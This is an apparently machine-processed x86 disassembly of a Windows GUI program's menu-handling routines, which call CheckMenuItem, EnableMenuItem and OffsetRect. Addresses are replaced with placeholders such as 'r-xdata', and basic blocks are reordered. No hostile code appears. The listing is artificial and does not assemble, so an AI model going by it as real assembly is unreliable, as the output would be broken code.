mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_431928
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx ebx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432e49
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_430984
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] 0xa
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp - 0x4 ]
call sub_4243b8
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x29 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ ebp - 0x4 ]
call sub_431928
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_432fb8
push ebx
xor ebx ebx
mov edx [ eax + 0x64 ]
jmp r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
cmp [ edx + 0x7c ] 0x0
je r-xdata
call sub_4339a4
test eax eax
je r-xdata
mov ebx [ edx + 0x7c ]
jmp r-xdata
mov edx [ edx + 0x64 ]
mov eax ebx
pop ebx
retn
mov ebx [ eax + 0x48 ]
sub_432fe8
push ebp
mov ebp esp
add esp 0xfffffeac
mov [ ebp - 0x154 ] 0x154
push 0x0
lea eax [ ebp - 0x154 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xbc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xb8 ]
mov [ eax ] edx
sub_433034
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov edi eax
xor eax eax
push ebp
push sub_433216
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xfff2
call sub_404160
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
push ebp
call sub_432fe8
pop ecx
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffffe
xor eax eax
jmp r-xdata
mov eax edi
call sub_4339a4
mov esi eax
mov eax edi
call sub_432fb8
mov [ ebp - 0x10 ] eax
mov eax [ edi + 0x30 ]
mov edx r-xdata
call sub_405270
jne r-xdata
cmp [ edi + 0x4c ] 0x0
je r-xdata
cmp [ edi + 0x40 ] 0xffffffff
jg r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffff9
xor eax eax
mov eax [ edi + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x10
test bl bl
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_403728
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax ] 0x3
mov eax [ ebp - 0x4 ]
add [ eax ] 0xf
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x10
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
movzx ebx [ esi + 0x60 ]
jmp r-xdata
movzx esi [ edi + 0x60 ]
test si si
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ edi + 0x30 ]
call sub_404edc
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_430984
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x8 ]
mov edx [ edi + 0x30 ]
call sub_405170
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43321d
lea eax [ ebp - 0x24 ]
call sub_404e44
lea eax [ ebp - 0x8 ]
call sub_404e44
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx edi
mov eax [ edi + 0xa4 ]
call [ edi + 0xa0 ]
movzx eax bl
movzx eax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
lea edx [ ebp - 0x20 ]
push edx
push 0x0
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_431928
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
add eax 0x7
mov edx [ ebp - 0x4 ]
add [ edx ] eax
cmp [ edi + 0xa2 ] 0x0
je r-xdata
sub_433248
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx esi
call sub_405270
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_404e98
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_433270
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4333e4
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ eax + 0x3d ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x64 ]
call sub_4333f4
cmp ebx eax
je r-xdata
movzx edx [ eax + 0x3f ]
cmp dl [ ebx + 0x3f ]
jne r-xdata
xor edx edx
call sub_4332bc
sub_4332bc
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x38 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x38 ] bl
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
test bl bl
je r-xdata
test [ esi + 0x1c ] 0x2
jne r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
movzx eax bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_431898
push eax
call CheckMenuItem
mov eax esi
call sub_433270
sub_433310
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x39 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x39 ] bl
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov eax esi
call sub_4333e4
test eax eax
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
test [ esi + 0x1c ] 0x2
jne r-xdata
movzx eax bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_431898
push eax
call EnableMenuItem
sub_433388
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x3f ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov [ esi + 0x3f ] bl
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_43374c
mov edx eax
mov ecx ebx
mov eax edi
call sub_431838
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov eax esi
call sub_433270
sub_4333f4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_4167c8
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_4308d8
sub_433464
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_4333e4
test esi esi
jge r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax ebx
call sub_43344c
cmp esi eax
je r-xdata
mov esi eax
dec esi
mov edi [ ebx + 0x64 ]
mov edx ebx
mov eax edi
call sub_433780
mov ecx ebx
mov edx esi
mov eax edi
call sub_433570
sub_4334ac
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4333e4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4333f4
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_433504
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x3a ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ ebp + 0x3a ] bl
mov dl 0x1
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebp + 0x64 ] 0x0
je r-xdata
mov eax [ ebp + 0x64 ]
call sub_4333e4
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_4333f4
mov [ eax + 0x3a ] 0x0
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_4333f4
cmp [ eax + 0x3a ] 0x0
je r-xdata
sub_433570
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp [ esi + 0x64 ] 0x0
je r-xdata
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_4308d8
mov ebp edi
dec ebp
test ebp ebp
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebx + 0x5c ] eax
movzx ecx [ esi + 0x3f ]
mov edx edi
mov eax ebx
call sub_431838
mov ecx esi
mov edx edi
mov eax [ ebx + 0x5c ]
call sub_416844
mov [ esi + 0x64 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x80 ] sub_4337ec
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x5c ]
cmp ebp [ eax + 0x8 ]
jge r-xdata
mov eax ebx
call sub_4333e4
dec eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_431768
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_4167c8
movzx eax [ eax + 0x3f ]
cmp al [ esi + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_4167c8
movzx edx [ eax + 0x3f ]
mov eax esi
call sub_433388
sub_433628
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_4308d8
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax ebx
call sub_4333e4
test eax eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_431768
mov eax ebx
call sub_4333e4
cmp esi eax
jl r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_4167c8
mov edi eax
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_4166b4
xor eax eax
mov [ edi + 0x64 ] eax
xor eax eax
mov [ edi + 0x80 ] eax
mov [ edi + 0x84 ] eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
sub_43369c
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x39 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
jne r-xdata
movzx edx [ ebx + 0x38 ]
xor dl 0x1
mov eax ebx
call sub_4332bc
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_4333cc
test eax eax
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax ebx
call sub_4333cc
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x88 ]
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_433764
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4333e4
mov edx eax
mov ecx esi
mov eax ebx
call sub_433570
pop esi
pop ebx
retn
sub_433780
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_43374c
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_433628
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_4308d8
sub_4337a8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax esi
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
pop esi
pop ebx
retn
push ebx
mov ecx eax
mov edx esi
mov eax [ esi + 0x84 ]
call [ esi + 0x80 ]
xor eax eax
jmp r-xdata
cmp [ esi + 0x82 ] 0x0
je r-xdata
sub_4337ec
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
push 0x0
mov ecx esi
mov edx ebx
call sub_4337ec
jmp r-xdata
mov eax ebx
call sub_431768
cmp [ ebx + 0x6c ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
call sub_435770
sub_433844
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebx + 0x4c ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42830c
mov [ ebx + 0x4c ] eax
sub_43386c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebx + 0x44 ]
call sub_403f64
xor eax eax
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x44 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_433b04
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_404160
mov edx ebx
mov eax edi
call sub_41db30
mov eax ebx
mov si 0xffee
call sub_404160
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x44 ] eax
pop edi
pop esi
pop ebx
retn
sub_4338dc
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x4c ] 0x0
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42830c
mov [ esi + 0x4c ] eax
sub_433910
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_4333e4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4333f4
mov edx [ eax ]
call [ edx + 0x40 ]
inc esi
dec ebx
jne r-xdata
sub_433950
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_433780
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov eax [ esi + 0x34 ]
mov edx ebx
call sub_433764
jmp r-xdata
mov edx ebx
mov eax esi
call sub_433764
sub_4339b4
push ebx
mov ebx eax
cmp dl [ ebx + 0x3d ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x3d ] dl
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x3d ] 0x0
je r-xdata
mov eax ebx
call sub_433270
sub_4339e0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
movzx eax [ edi + 0x95 ]
mov [ esi + 0xa8 ] al
cmp [ esi + 0xa8 ] 0x0
jne r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_433248
cmp [ esi + 0x30 ] 0x0
jne r-xdata
test bl bl
je r-xdata
movzx edx [ edi + 0x69 ]
mov eax esi
call sub_4332bc
cmp [ esi + 0x38 ] 0x0
jne r-xdata
test bl bl
je r-xdata
movzx edx [ edi + 0x6a ]
mov eax esi
call sub_433310
cmp [ esi + 0x39 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esi + 0x54 ] eax
cmp [ esi + 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
lea eax [ esi + 0x58 ]
mov edx [ edi + 0x7c ]
call sub_404e98
cmp [ esi + 0x58 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov edx [ edi + 0x80 ]
mov eax esi
call sub_43343c
cmp [ esi + 0x40 ] 0xffffffff
jne r-xdata
movzx edx [ edi + 0x6c ]
mov eax esi
call sub_433388
cmp [ esi + 0x3f ] 0x0
jne r-xdata
movzx edx [ edi + 0x84 ]
mov eax esi
call sub_433418
cmp [ esi + 0x60 ] 0x0
jne r-xdata
test bl bl
je r-xdata
movzx edx [ edi + 0x86 ]
mov eax esi
call sub_43342c
cmp [ esi + 0x3e ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x88 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x8c ] eax
cmp [ esi + 0x8a ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_433b04
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4333cc
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_404160
sub_433b28
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_433b48
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_433b68
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_433b88
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_433ba8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_433bc8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_433be8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_433c08
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_433c28
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_433c48
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_416eac
movzx edx [ ebx + 0x39 ]
mov edi esi
mov eax edi
call sub_44bd80
mov edx [ ebx + 0x54 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x58 ]
mov eax edi
call sub_44bebc
mov edx [ ebx + 0x40 ]
mov eax edi
call sub_44bf1c
mov edx [ ebx + 0x30 ]
mov eax edi
call sub_44bc18
movzx edx [ ebx + 0x3e ]
mov eax edi
call sub_44bfdc
push [ ebx + 0x8c ]
push [ ebx + 0x88 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_433cc4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41dd8c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4333cc
cmp edi eax
jne r-xdata
cmp edi [ esi + 0x7c ]
jne r-xdata
xor edx edx
mov eax esi
call sub_43386c
jmp r-xdata
cmp edi [ esi + 0x68 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_433d18
jmp r-xdata
xor edx edx
mov eax esi
call sub_4316f0
sub_433d18
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x7c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x78 ]
call sub_44a5d8
mov eax ebx
call sub_433d88
pop esi
pop ebx
retn
mov edx [ ebx + 0x78 ]
call sub_44a61c
mov edx ebx
mov eax [ ebx + 0x7c ]
call sub_41db30
sub_433d60
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_433d60
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_430dcc
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_4337ec
mov eax ebx
pop esi
pop ebx
retn
sub_433d9c
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40e924
test eax eax
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx 0x1
xchg edx eax
call sub_4053c4
sub_433dcc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_404edc
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_433e50
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_433f93
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
test eax eax
je r-xdata
test eax eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov esi 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov esi [ ebp - 0x10 ]
test esi esi
je r-xdata
inc esi
dec eax
jne r-xdata
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433f9a
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_404e68
retn
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax r-xdata
call sub_40540c
lea eax [ ebp - 0x14 ]
push eax
mov edx esi
sub edx 0x3
inc edx
mov eax [ ebx ]
mov ecx 0x3
call sub_405384
mov eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_405270
jne r-xdata
sub esi 0x4
mov esi [ esi ]
mov edx [ ebx ]
movzx edx [ edx + esi - 0x1 ]
mov ecx [ rw-data ]
movzx edx dl
bt [ ecx ] edx
jae r-xdata
push [ ebx ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax ebx
mov edx 0x5
call sub_4051e4
jmp r-xdata
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov esi [ ebp - 0x10 ]
test esi esi
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
sub ecx 0x3
mov eax [ ebx ]
mov edx 0x1
call sub_405384
push [ ebp - 0x18 ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax ebx
mov edx 0x6
call sub_4051e4
jmp r-xdata
sub esi 0x4
mov esi [ esi ]
sub_433fd0
push ebp
mov ebp esp
